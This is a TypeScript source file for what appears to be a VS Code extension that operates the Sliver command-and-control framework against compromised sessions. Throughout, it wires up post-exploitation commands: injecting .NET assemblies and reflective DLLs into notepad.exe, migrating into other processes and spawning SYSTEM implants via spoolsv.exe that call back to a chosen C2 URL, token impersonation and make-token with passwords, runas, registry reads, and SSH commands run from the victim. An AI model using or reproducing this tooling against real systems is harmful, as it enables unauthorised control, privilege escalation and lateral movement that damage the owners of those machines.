import * as vscode from 'vscode';
import { ConnectionManager } from '../client/ConnectionManager';
import { friendlyError, requireActive, showText, resolveSession, pickProcess, Node } from './helpers';

const dec = (b: any) => Buffer.from(b ?? []).toString('utf8');

export function registerTier2(connections: ConnectionManager): vscode.Disposable[] {
  const reg = (id: string, fn: (...a: any[]) => any) => vscode.commands.registerCommand(id, fn);
  const active = () => requireActive(connections);
  const sess = (n?: Node) => resolveSession(connections, n);

  return [
    // --- Post-exploitation execution ----------------------------------
    reg('sliver.session.executeAssembly', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const file = await vscode.window.showOpenDialog({ canSelectMany: false, openLabel: 'Select .NET assembly' });
      if (!file?.length) {
        return;
      }
      const args = (await vscode.window.showInputBox({ prompt: 'Assembly arguments' })) ?? '';
      const data = Buffer.from(await vscode.workspace.fs.readFile(file[0]));
      try {
        const r = await client.executeAssembly({
          Assembly: data,
          Arguments: args ? args.split(/\s+/) : [],
          Process: 'c:\\windows\\system32\\notepad.exe',
          Request: { SessionID: s.ID, Timeout: '120' },
        });
        await showText(dec(r.Output) || '(no output)');
      } catch (err) {
        void vscode.window.showErrorMessage(`execute-assembly failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.sideload', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const file = await vscode.window.showOpenDialog({ canSelectMany: false, openLabel: 'Select shared library' });
      if (!file?.length) {
        return;
      }
      const entry = (await vscode.window.showInputBox({ prompt: 'Entrypoint (optional)' })) ?? '';
      const args = (await vscode.window.showInputBox({ prompt: 'Arguments' })) ?? '';
      const data = Buffer.from(await vscode.workspace.fs.readFile(file[0]));
      try {
        const r = await client.sideload({
          Data: data,
          EntryPoint: entry,
          Args: args ? args.split(/\s+/) : [],
          ProcessName: 'c:\\windows\\system32\\notepad.exe',
          Request: { SessionID: s.ID, Timeout: '120' },
        });
        await showText(r.Result || '(no output)');
      } catch (err) {
        void vscode.window.showErrorMessage(`sideload failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.spawnDll', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const file = await vscode.window.showOpenDialog({ canSelectMany: false, openLabel: 'Select reflective DLL' });
      if (!file?.length) {
        return;
      }
      const entry = (await vscode.window.showInputBox({ prompt: 'Export/entrypoint', value: 'ReflectiveLoader' })) ?? '';
      const args = (await vscode.window.showInputBox({ prompt: 'Arguments' })) ?? '';
      const data = Buffer.from(await vscode.workspace.fs.readFile(file[0]));
      try {
        const r = await client.spawnDll({
          Data: data,
          EntryPoint: entry,
          Args: args ? args.split(/\s+/) : [],
          ProcessName: 'c:\\windows\\system32\\notepad.exe',
          Request: { SessionID: s.ID, Timeout: '120' },
        });
        await showText(dec(r.Result) || '(no output)');
      } catch (err) {
        void vscode.window.showErrorMessage(`spawndll failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.migrate', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const pid = await pickProcess(client, s.ID, 'Process to migrate into');
      if (pid === undefined) {
        return;
      }
      const c2 = await vscode.window.showInputBox({ prompt: 'C2 URL for the migrated implant', value: 'mtls://' });
      if (!c2) {
        return;
      }
      try {
        const r = await client.migrate({
          Pid: pid,
          Config: {
            GOOS: s.OS,
            GOARCH: s.Arch,
            Format: 1, // shellcode
            IsBeacon: false,
            TemplateName: 'sliver',
            HTTPC2ConfigName: 'default',
            C2: [{ Priority: 0, URL: c2, Options: '' }],
          },
          Request: { SessionID: s.ID, Timeout: '120' },
        });
        void vscode.window.showInformationMessage(r.Success ? `Migrated into PID ${r.Pid}` : 'Migrate failed');
      } catch (err) {
        void vscode.window.showErrorMessage(`migrate failed: ${friendlyError(err)}`);
      }
    }),

    // --- Privilege / tokens (Windows) ---------------------------------
    reg('sliver.session.getsystem', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const c2 = await vscode.window.showInputBox({ prompt: 'C2 URL for the SYSTEM implant', value: 'mtls://' });
      if (!c2) {
        return;
      }
      try {
        await client.getSystem({
          HostingProcess: 'spoolsv.exe',
          Config: {
            GOOS: s.OS,
            GOARCH: s.Arch,
            Format: 1,
            IsBeacon: false,
            TemplateName: 'sliver',
            HTTPC2ConfigName: 'default',
            C2: [{ Priority: 0, URL: c2, Options: '' }],
          },
          Request: { SessionID: s.ID, Timeout: '120' },
        });
        void vscode.window.showInformationMessage('getsystem requested — watch for a new SYSTEM session.');
      } catch (err) {
        void vscode.window.showErrorMessage(`getsystem failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.getprivs', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      try {
        const r = await client.getPrivs(s.ID);
        const lines = (r.PrivInfo ?? []).map((p: any) => `${p.Name}\t${p.Description}\t${p.Enabled ? 'enabled' : ''}`);
        await showText([`Integrity: ${r.ProcessIntegrity}  Process: ${r.ProcessName}`, '', ...lines].join('\n'));
      } catch (err) {
        void vscode.window.showErrorMessage(`getprivs failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.impersonate', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const user = await vscode.window.showInputBox({ prompt: 'Username to impersonate (DOMAIN\\user)' });
      if (!user) {
        return;
      }
      try {
        await client.impersonate({ Username: user, Request: { SessionID: s.ID } });
        void vscode.window.showInformationMessage(`Impersonating ${user}`);
      } catch (err) {
        void vscode.window.showErrorMessage(`impersonate failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.runas', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const user = await vscode.window.showInputBox({ prompt: 'Run as username' });
      const program = user && (await vscode.window.showInputBox({ prompt: 'Program to run' }));
      if (!user || !program) {
        return;
      }
      const args = (await vscode.window.showInputBox({ prompt: 'Arguments' })) ?? '';
      try {
        const r = await client.runAs({ Username: user, ProcessName: program, Args: args, Request: { SessionID: s.ID } });
        await showText(r.Output || '(no output)');
      } catch (err) {
        void vscode.window.showErrorMessage(`runas failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.makeToken', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const user = await vscode.window.showInputBox({ prompt: 'Username' });
      const domain = user && (await vscode.window.showInputBox({ prompt: 'Domain' }));
      const pass = domain !== undefined && (await vscode.window.showInputBox({ prompt: 'Password', password: true }));
      if (!user || domain === undefined || pass === false) {
        return;
      }
      try {
        await client.makeToken({ Username: user, Domain: domain || '', Password: pass || '', LogonType: 9, Request: { SessionID: s.ID } });
        void vscode.window.showInformationMessage(`Token created for ${domain}\\${user}`);
      } catch (err) {
        void vscode.window.showErrorMessage(`make-token failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.rev2self', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      try {
        await client.revToSelf(s.ID);
        void vscode.window.showInformationMessage('Reverted to self.');
      } catch (err) {
        void vscode.window.showErrorMessage(`rev2self failed: ${friendlyError(err)}`);
      }
    }),

    // --- Env / registry -----------------------------------------------
    reg('sliver.session.setenv', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const key = await vscode.window.showInputBox({ prompt: 'Env variable name' });
      const value = key && (await vscode.window.showInputBox({ prompt: 'Value' }));
      if (!key || value === undefined) {
        return;
      }
      try {
        await client.setEnv({ Variable: { Key: key, Value: value || '' }, Request: { SessionID: s.ID } });
        void vscode.window.showInformationMessage(`Set ${key}`);
      } catch (err) {
        void vscode.window.showErrorMessage(`setenv failed: ${friendlyError(err)}`);
      }
    }),

    reg('sliver.session.registryRead', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const hive = await vscode.window.showQuickPick(['HKCU', 'HKLM', 'HKCC', 'HKPD', 'HKU', 'HKCR'], { placeHolder: 'Hive' });
      const rpath = hive && (await vscode.window.showInputBox({ prompt: 'Key path (e.g. Software\\Microsoft\\...)' }));
      if (!hive || !rpath) {
        return;
      }
      const key = (await vscode.window.showInputBox({ prompt: 'Value name (blank for default)' })) ?? '';
      try {
        const r = await client.registryRead({ Hive: hive, Path: rpath, Key: key, Hostname: '', Request: { SessionID: s.ID } });
        await showText(String(r.Value ?? '(empty)'));
      } catch (err) {
        void vscode.window.showErrorMessage(`registry read failed: ${friendlyError(err)}`);
      }
    }),

    // --- SSH ----------------------------------------------------------
    reg('sliver.session.ssh', async (node?: Node) => {
      const client = active();
      const s = client && (await sess(node));
      if (!client || !s) {
        return;
      }
      const host = await vscode.window.showInputBox({ prompt: 'SSH host' });
      const user = host && (await vscode.window.showInputBox({ prompt: 'SSH username' }));
      const cmd = user && (await vscode.window.showInputBox({ prompt: 'Command to run' }));
      if (!host || !user || !cmd) {
        return;
      }
      const pass = (await vscode.window.showInputBox({ prompt: 'Password (blank to use agent/key)', password: true })) ?? '';
      try {
        const r = await client.runSSHCommand({ Hostname: host, Username: user, Port: 22, Command: cmd, Password: pass, Request: { SessionID: s.ID, Timeout: '60' } });
        await showText(`${r.StdOut ?? ''}\n${r.StdErr ?? ''}`.trim() || '(no output)');
      } catch (err) {
        void vscode.window.showErrorMessage(`ssh failed: ${friendlyError(err)}`);
      }
    }),
  ];
}
